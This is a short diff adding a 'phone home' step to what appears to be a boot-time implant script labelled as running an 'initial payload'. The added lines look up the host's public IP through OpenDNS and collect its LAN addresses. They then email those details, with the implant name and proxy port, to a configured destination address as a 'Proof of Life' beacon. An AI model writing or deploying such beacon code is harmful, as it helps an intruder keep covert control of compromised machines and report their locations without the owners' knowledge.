@@ -97,3 +97,7 @@ $LOKIHOME/$MYNAME-onboot.sh
 
 # Run initial payload
 ## phone home
+WANIP=$(dig +short myip.opendns.com @resolver1.opendns.com)
+LANIP=$(ip a| grep inet| grep -v inet6| grep -v 127.0.0.1)
+
+mail -s "Proof of Life $MYNAME / $WANIP / Port $PROXYPORT" $DESTEMAIL
